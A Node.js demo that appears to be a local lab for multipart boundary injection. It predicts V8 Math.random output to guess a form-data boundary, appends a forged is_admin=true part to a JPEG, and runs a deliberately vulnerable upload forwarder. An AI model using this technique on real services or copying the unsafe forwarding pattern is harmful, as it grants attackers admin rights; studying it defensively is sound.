const http = require("http");
const fs = require("fs");
const path = require("path");
const FormData = require("form-data");
const predictV8Randomness = require("predict-v8-randomness");

const port = 5002;
const craftedImagePath = path.join(__dirname, "../cabo-pero-injected.jpeg");

// Generate crafted image with injected payload for HPP
function generateCraftedImage(callback) {
  const initialSequence = [
    Math.random(),
    Math.random(),
    Math.random(),
    Math.random(),
  ];
  const predictor = new predictV8Randomness.Predictor(initialSequence);
  predictor.predictNext(24).then(function (next24RandomOutputs) {
    const predictedBoundary = next24RandomOutputs
      .map((v) => Math.floor(v * 10).toString(16))
      .join("");
    const boundaryIntro = "----------------------------";
    const boundary = boundaryIntro + predictedBoundary;
    console.log("Predicted boundary:", boundary);
    const injectedPayload =
      "\r\n" +
      boundary +
      '\r\nContent-Disposition: form-data; name="is_admin"\r\n\r\ntrue\r\n' +
      boundary +
      "--\r\n";
    const imagePath = path.join(__dirname, "../cabo-pero.jpeg");
    const imageStream = fs.createReadStream(imagePath);
    const { PassThrough } = require("stream");
    const combinedStream = new PassThrough();
    imageStream.on("end", () => {
      combinedStream.write(injectedPayload);
      combinedStream.end();
    });
    imageStream.pipe(combinedStream, { end: false });
    const fileWriteStream = fs.createWriteStream(craftedImagePath);
    combinedStream.pipe(fileWriteStream);
    fileWriteStream.on("finish", callback);
  });
}

// Handle image upload and forward to image service
function handleUpload(req, res) {
  // Forward to image service using streaming
  const formData = new FormData();
  formData.append("image", req, {
    filename: "upload.jpeg",
    contentType: "image/jpeg",
  });
  formData.append("is_admin", "false");
  console.log("Boundary:", formData.getBoundary());

  formData.submit("http://localhost:5003/process", (err, resp) => {
    if (err) {
      res.writeHead(500);
      res.end("Error forwarding to image service");
      return;
    }
    resp.resume();
    res.writeHead(200);
    res.end("Image processed by image service");
  });
}

// Start server after crafted image is generated
generateCraftedImage(() => {
  http
    .createServer((req, res) => {
      // Handle CORS for all requests
      res.setHeader("Access-Control-Allow-Origin", "http://localhost:5500");
      res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
      res.setHeader("Access-Control-Allow-Headers", "Content-Type");
      if (req.method === "OPTIONS") {
        res.writeHead(204);
        res.end();
        return;
      }
      if (req.url === "/upload" && req.method === "POST") {
        handleUpload(req, res);
      } else {
        res.writeHead(404);
        res.end("Not found");
      }
    })
    .listen(port, () => {
      console.log(`Web API running at http://localhost:${port}`);
    });
});

process.on("SIGINT", function () {
  // Delete crafted image file on SIGINT
  if (fs.existsSync(craftedImagePath)) {
    fs.unlinkSync(craftedImagePath);
  }
  console.log("Crafted image file deleted.");
  process.exit();
});
